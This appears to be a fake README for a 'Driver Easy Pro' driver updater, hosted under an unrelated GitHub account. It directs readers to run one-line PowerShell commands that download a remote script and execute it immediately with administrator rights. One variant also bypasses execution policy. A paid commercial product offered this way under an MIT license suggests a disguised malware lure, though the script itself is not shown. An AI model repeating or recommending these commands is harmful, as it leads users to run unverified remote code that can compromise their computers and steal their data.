# Driver Easy Pro Setup
the automatic driver updater with an 8M+ driver database that detects and fixes all outdated drivers with a single scan.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for driver installation to system directories.
- Downloads the Driver Easy Pro installer and runs it in silent mode.
- Scans all hardware and detects every outdated or missing driver in one pass.
- Installs all recommended drivers with a single click and no reboots between drivers.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~180 MB free disk space

## Troubleshooting

**Update All button is greyed out after the scan completes**

Sign in to your Driver Easy Pro account first â€” the batch update feature requires an active Pro subscription.

**GPU driver update causes display resolution to change unexpectedly**

Use the Drivers Backup tool in Driver Easy to restore the previous working graphics driver version.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.